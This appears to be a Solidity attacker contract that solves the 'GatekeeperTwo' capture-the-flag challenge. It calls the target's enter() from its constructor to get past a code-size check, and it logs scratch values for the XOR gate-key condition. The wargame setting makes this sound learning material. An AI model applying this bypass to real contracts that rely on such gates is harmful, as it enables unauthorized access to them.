pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/

interface IGatekeeperTwoChallenge {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    // Only the constructor and attack() are relevant here. Everything else were scratch
    // functions to help me reason about what was happening
    IGatekeeperTwoChallenge public challenge;

    uint32 public gateOneA;
    uint16 public gateOneB;

    uint32 public gateTwoA;
    uint64 public gateTwoB;

    uint64 public g3LHSa;
    uint64 public g3LHSb;
    uint64 public g3LHS;

    uint64 public g3RHS;

    address public caller;
    
    bytes8 _gateKey;

    uint public codesize;

    constructor(address challengeAddress, bytes8 key) {
        // Only this line and `challenge.enter(key);` are necessary. The rest is for testing/understanding.
        challenge = IGatekeeperTwoChallenge(challengeAddress);

        _gateKey = key;
        address _caller;
        assembly { _caller := caller() }
        caller = _caller;

        g3LHSa = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        g3LHSb = uint64(_gateKey);

        g3LHS = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(_gateKey);
        g3RHS = uint64(0) - 1;

        challenge.enter(key);
    }
}
